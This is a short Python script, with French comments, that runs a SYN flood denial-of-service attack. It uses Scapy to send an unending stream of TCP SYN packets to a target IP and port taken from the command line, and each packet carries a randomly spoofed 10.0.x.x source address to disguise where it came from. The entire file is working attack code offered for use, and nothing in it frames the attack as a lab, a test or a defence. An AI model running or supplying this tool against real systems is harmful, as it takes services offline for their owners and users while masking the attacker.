#!/usr/bin/env python3
# DDoS SYN Flood avec IP spoofées
# Usage: python3 ddos_spoofed_syn.py <target_ip> <port> <iface>

import sys
import random
import time
from scapy.all import IP, TCP, send, conf, Scapy_Exception

def spoofed_syn_flood(dst_ip, dst_port, iface, delay=0.001):
    conf.iface = iface
    print(f"[INFO] Spoofed SYN Flood sur {dst_ip}:{dst_port}")

    try:
        while True:
            src_ip = f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)

            pkt = (
                IP(src=src_ip, dst=dst_ip) /
                TCP(sport=src_port, dport=dst_port, flags="S")
            )

            try:
                send(pkt, verbose=False)
            except Scapy_Exception as e:
                print(f"[WARNING] Impossible d'envoyer le paquet : {e}")
                continue
            time.sleep(delay)

    except KeyboardInterrupt:
        print("\n[INFO] Arrêté par l'utilisateur.")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 ddos_spoofed_syn.py <target_ip> <port> <iface>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    iface = sys.argv[3]

    spoofed_syn_flood(target_ip, target_port, iface)
